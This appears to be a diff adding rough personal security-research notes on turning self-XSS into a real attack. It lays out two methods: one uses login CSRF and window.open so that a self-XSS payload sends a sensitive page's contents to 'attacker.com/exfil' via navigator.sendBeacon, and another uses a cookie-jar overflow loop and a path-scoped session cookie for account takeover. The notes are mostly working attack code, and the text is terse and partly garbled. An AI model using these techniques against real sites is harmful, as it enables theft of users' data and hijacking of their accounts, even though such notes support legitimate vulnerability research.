@@ -1,0 +1,33 @@
+https://www.youtube.com/watch?v=_VGEtJSRkjg&list=PLvxs_epf2X91OBhbtGubo6p-foIuLNx_W
+user is logged in
+attacker.com
+
+method 1:
+// open sensitive window
+windowWithSensitiveSata = window.open("//target.com/api")
+// open attacker account using csrf
+window.open("//.....")
+window.open('//target.com/selfxsspage')
+//in self-xss payload
+navigator.sendBeacon('//attacker.com/exfil',windowWithSensitiveSata.document.body.innerHTML)
+
+another way is that rather than getting data from sensitive website by opening a new window, the attacker is able to go for ATO
+method 2:
+// open attacker account using csrf
+window.open("//.....")
+window.open('//target.com/selfxsspage')
+make the attacker logged in to attacker account only in the page with self-xss
+// Cookie Jar overflow
+// empty the cookie
+const cookiejar_size=300
+for(let i=0;i<cookiejar_size;i++) {
+  document.cookie = "cookie"+i+"=a;Secure"
+}
+// clear these cookies
+for(let i=0;i<cookiejar_size;i++) {
+  document.cookie = "cookie"+i+"=a;expires=Thu, 01 Jan 1970 00:00:01 GMT"
+}
+SET-COOKIE: token;PATH=/ // so with this way only the page with the page here will be logged in with attacker account
+// now when the user logs in and navigate to the vulnerable page then the xss payload will be executed
+// Note if you can find a cookie that redirects user after login then this can be better
+// if we can't do this and the page is not commonly navigated to then maybe in the future after we know the user must have logged in we can send him another link
